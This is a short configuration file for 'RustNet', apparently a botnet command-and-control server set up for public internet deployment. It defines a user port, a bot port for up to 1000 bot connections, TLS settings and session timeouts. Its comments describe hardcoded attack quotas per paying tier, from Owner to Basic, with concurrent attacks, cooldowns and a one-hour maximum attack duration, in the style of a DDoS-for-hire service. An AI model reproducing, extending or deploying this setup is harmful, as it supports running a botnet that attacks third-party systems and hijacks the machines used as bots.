# RustNet Server Configuration

[server]
# Port for user connections
user_port = 1420

# Port for bot connections  
bot_port = 7002

# Enable TLS encryption (REQUIRED for public deployment)
enable_tls = true

# TLS certificate paths
cert_path = "cert.pem"
key_path = "key.pem"

# Deployment mode: "local" or "public"
# - "local": For private network use (TLS recommended but optional)
# - "public": For internet deployment (TLS REQUIRED, will not start without it)
deployment_mode = "public"

[limits]
# Maximum number of bot connections
max_bots = 1000

# Session timeout in seconds (30 minutes default)
session_timeout_secs = 1800

# NOTE: Attack limits and cooldowns are hardcoded per user level:
# - Owner: 10 concurrent attacks, 0s cooldown
# - Admin: 5 concurrent attacks, 30s cooldown  
# - Pro: 3 concurrent attacks, 60s cooldown
# - Basic: 1 concurrent attack, 120s cooldown
# Maximum attack duration is hardcoded to 3600 seconds (1 hour)
